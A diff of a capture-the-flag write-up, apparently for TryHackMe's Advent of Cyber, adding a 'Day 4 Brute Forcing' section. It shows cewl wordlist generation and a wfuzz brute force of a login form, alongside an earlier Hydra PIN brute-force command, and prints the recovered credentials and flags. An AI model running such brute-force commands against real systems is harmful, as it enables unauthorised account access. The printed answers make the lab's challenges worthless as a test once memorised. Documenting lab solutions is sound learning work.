@@ -32,3 +32,17 @@ Viewing Page source of the login page to find the method, server URL and name of
 ![image](https://github.com/Azure9733/JTP23-WriteUps/assets/143328010/a8b9143b-43c5-4709-bc80-2e910c93a46b)  
 Now using Hydra ``hydra -l '' -P 3digits.txt -f -v 10.10.211.75 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000`` I brute force the password(6F5).  
 Answer: ``THM{pin-code-brute-force}``  
+## Day 4 Brute Forcing  
+What is the correct username and password combination?   
+Input: Installed cewl via the terminal. Then visited ``http://(MachineIP)/login.php``  
+Using ``cewl -d 2 -m 5 -w cewlpasswords.txt http://(MachineIP) --with-numbers`` i create a list of potential passwords  
+Using ``cewl -d 0 -m 5 -w cewlusernames.txt http://(MachineIP)/team.php --lowercase`` I create a list of potential usernames  
+![image](https://github.com/Azure9733/JTP23-WriteUps/assets/143328010/81ba3f61-3acf-430a-af93-9bb0246a5371)  
+Now I brute force using `` wfuzz -c -z file,cewlusernames.txt -z file,cewlpasswords.txt --hs "Please enter the correct credentials" -u http://10.10.149.108/login.php -d "username=FUZZ&password=FUZ2Z"``  
+![image](https://github.com/Azure9733/JTP23-WriteUps/assets/143328010/9a6b9ad5-fc50-444c-8fc3-c3ed520ee9ce)  
+Answer: ``isaias:Happiness``
+What is the flag?  
+Input: Using username and password i logged into the website.  
+![image](https://github.com/Azure9733/JTP23-WriteUps/assets/143328010/0c6382cf-653e-4cce-9dfe-37cb3042927f)  
+Answer:``THM{m3rrY4nt4rct1crAft$}``  
+
